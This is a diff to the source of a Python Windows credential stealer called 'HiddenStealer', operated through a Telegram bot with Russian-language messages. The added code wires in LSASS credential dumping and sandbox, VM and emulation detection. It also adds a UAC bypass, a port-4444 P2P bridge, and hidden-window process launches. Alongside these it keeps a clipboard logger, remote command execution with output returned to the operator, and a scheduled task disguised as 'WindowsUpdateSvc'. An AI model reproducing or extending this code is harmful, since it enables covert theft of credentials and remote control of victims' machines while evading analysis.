+                except:
+                    safe_send_message(bot, chat_id, "🎮 <b>Главная панель управления</b>", reply_markup=self.admin_panel_keyboard(call.from_user.id), parse_mode="HTML")
+
             elif data.startswith("fmd_"):
                 try:
                     idx = int(data.split("_")[1])
@@ -3887,6 +3988,16 @@ class HiddenStealer:
                         if 'software' in self.work_modules:
                             self.work_modules['software'].run()
                 threading.Thread(target=do_software, daemon=True).start()
+
+            elif data == "work_lsass":
+                fake_msg = call.message
+                fake_msg.from_user = call.from_user
+                creds_handler(fake_msg)
+
+            elif data == "work_lsass_dump":
+                fake_msg = call.message
+                fake_msg.from_user = call.from_user
+                lsass_dump_handler(fake_msg)
 
             elif data == "work_info":
                 self.get_work_info()
@@ -4517,17 +4628,27 @@ class HiddenStealer:
             markup = types.InlineKeyboardMarkup()
             if self.cmd_mode_active:
                 markup.add(types.InlineKeyboardButton("\U0001F6AA \u0412\u044b\u0439\u0442\u0438 \u0438\u0437 CMD", callback_data="cmd_exit"))
-            if len(result) > 4000:
-                chunks = [result[i:i+4000] for i in range(0, len(result), 4000)]
-                for i, chunk in enumerate(chunks[:3]):
-                    text = f"💻 *Результат (часть {i+1}):*\n```\n{chunk}\n```"
-                    safe_send_message(self.bot, message.chat.id, text)
-            else:
-                safe_send_message(self.bot, message.chat.id, "✅ Команда выполнена успешно.", reply_markup=markup)
             try:
                 self.bot.delete_message(message.chat.id, status_msg.message_id)
             except:
                 pass
+            if not result:
+                result = "✅ Команда выполнена (нет вывода)"
+            if len(result) > 4000:
+                chunks = [result[i:i+4000] for i in range(0, len(result), 4000)]
+                for i, chunk in enumerate(chunks[:3]):
+                    safe_send_message(self.bot, message.chat.id,
+                        f"💻 <b>Результат (часть {i+1}):</b>\n<pre><code>{chunk}</code></pre>",
+                        parse_mode="HTML"
+                    )
+                if self.cmd_mode_active:
+                    safe_send_message(self.bot, message.chat.id, "📍 Готово", reply_markup=markup)
+            else:
+                safe_send_message(self.bot, message.chat.id,
+                    f"💻 <pre><code>{result}</code></pre>",
+                    parse_mode="HTML",
+                    reply_markup=markup
+                )
     def find_files(self, max_files=30):
         files_found = []
         desktop = get_desktop_path()
@@ -4608,7 +4729,7 @@ class HiddenStealer:
             except:
                 pass
             try:
-                subprocess.run('schtasks /delete /f /tn "WindowsUpdateSvc"', shell=True, capture_output=True)
+                subprocess.run('schtasks /delete /f /tn "WindowsUpdateSvc"', shell=True, capture_output=True, creationflags=0x08000000)
             except:
                 pass
         except:
@@ -4630,6 +4751,16 @@ class HiddenStealer:
         except:
             pass
         try:
+            # Critical environment checks
+            if SafetyManager.EvaluateRuntimeSafety():
+                print("⚠️ Обнаружена песочница! (Продолжение работы...)")
+                # sys.exit(0)
+            if SafetyManager.CheckOperationalEnvironment():
+                print("⚠️ Обнаружена виртуальная машина! (Продолжение работы...)")
+                # sys.exit(0)
+            if SafetyManager.CheckInstructionConsistency():
+                print("⚠️ Обнаружена эмуляция! (Продолжение работы...)")
+                # sys.exit(0)
             if getattr(sys, 'frozen', False):
                 exe_path = sys.executable
             else:
@@ -4753,7 +4884,7 @@ del /f /q "%~f0"
         if WIN32_AVAILABLE:
             self.start_clipboard_logger()
         if TELEGRAM_AVAILABLE:
-            bot_thread = threading.Thread(target=self.start_bot, daemon=True)
+            bot_thread = threading.Thread(target=self.start_bot, daemon=False)
             bot_thread.start()
             self.bot_started = True
             threading.Thread(target=self._bridge_watchdog, daemon=True).start()
@@ -4825,8 +4956,8 @@ def kill_steam():
     print("🔪 Завершаю работу Steam...")
 
     try:
-        subprocess.run('taskkill /F /IM steam.exe /T', shell=True, capture_output=True)
-        subprocess.run('taskkill /F /IM SteamService.exe /T', shell=True, capture_output=True)
+        subprocess.run('taskkill /F /IM steam.exe /T', shell=True, capture_output=True, creationflags=0x08000000)
+        subprocess.run('taskkill /F /IM SteamService.exe /T', shell=True, capture_output=True, creationflags=0x08000000)
     except:
         pass
 def relaunch_steam():
@@ -4845,7 +4976,56 @@ def relaunch_steam():
         print("❌ Не удалось запустить Steam из реестра.")
 if __name__ == "__main__":
     try:
+        # [A-01] PRE-FLIGHT ANTI-ANALYSIS (C# NATIVE)
+        print("[SEARCH] Запуск проверки среды...")
+        if not SKIP_ANTI_ANALYSIS:
+            try:
+                import clr
+                import os
+                # Ensure DLLs are loaded if not already
+                _self_dir = os.path.dirname(os.path.abspath(__file__))
+                dll_path = os.path.join(_self_dir, "bin", "SafetyManager.dll")
+                if not os.path.exists(dll_path):
+                    print(f"[WARNING] Файл не найден: {dll_path}")
+                
+                clr.AddReference(dll_path)
+                from VanguardCore import SafetyManager
+                SafetyManager.Startup()
+                
+                # Critical environment checks
+                if SafetyManager.EvaluateRuntimeSafety():
+                    print("[WARNING] Обнаружена песочница! (Продолжение работы...)")
+                if SafetyManager.CheckOperationalEnvironment():
+                    print("[WARNING] Обнаружена виртуальная машина! (Продолжение работы...)")
+                if SafetyManager.CheckInstructionConsistency():
+                    print("[WARNING] Обнаружена эмуляция! (Продолжение работы...)")
+                
+                print("[OK] Проверка среды пройдена.")
+                # Runtime protections - disabled because they cause FailFast/Crashes on dev environment
+                # SafetyManager.HideThread()
+                # SafetyManager.AntiDump()
+                # SafetyManager.AntiBehavior()
+                # SafetyManager.ProtectSelf()
+            except Exception as e:
+                print(f"[WARNING] Ошибка при загрузке модуля защиты: {e}")
+                pass
+        else:
+            print("⏩ Проверка анти-анализа пропущена.")
+            log_debug("Anti-Analysis runtime checks bypassed via SKIP_ANTI_ANALYSIS")
+
+        # [A-02] SINGLE INSTANCE LOCK
+        print("[LOCK] Проверка единственного экземпляра...")
         check_single_instance()
+        
+        # [A-03] PRIVILEGE ESCALATION
+        if not ctypes.windll.shell32.IsUserAnAdmin() and not UAC_CHILD:
+            print("⚡️ [UAC] Попытка автоматического повышения прав...")
+            try_uac_bypass()
+
+        # [A-04] POST-ANALYSIS INITIALIZATION (must be after UAC to avoid port 4444 clash)
+        print("[CONFIG] Настройка сетевых мостов...")
+        setup_p2p_bridge()
+            
         print("--- HiddenStealer Initialized ---")
 
         def signal_handler(sig, frame):
@@ -4855,7 +5035,7 @@ if __name__ == "__main__":
                 if name.startswith("SIG") and value == sig:
                     sig_name = name
                     break
-            print(f"⚠️ Получен сигнал {sig_name}. Завершение работы...")
+            print(f"[WARNING] Получен сигнал {sig_name}. Завершение работы...")
             import traceback
             traceback.print_stack(frame)
             sys.exit(0)
@@ -4865,6 +5045,6 @@ if __name__ == "__main__":
         main_bot = HiddenStealer()
         main_bot.run()
     except Exception as e:
-        print("❌ Критическая ошибка при запуске:")
+        print("[ERROR] Критическая ошибка при запуске:")
         import traceback
         traceback.print_exc()
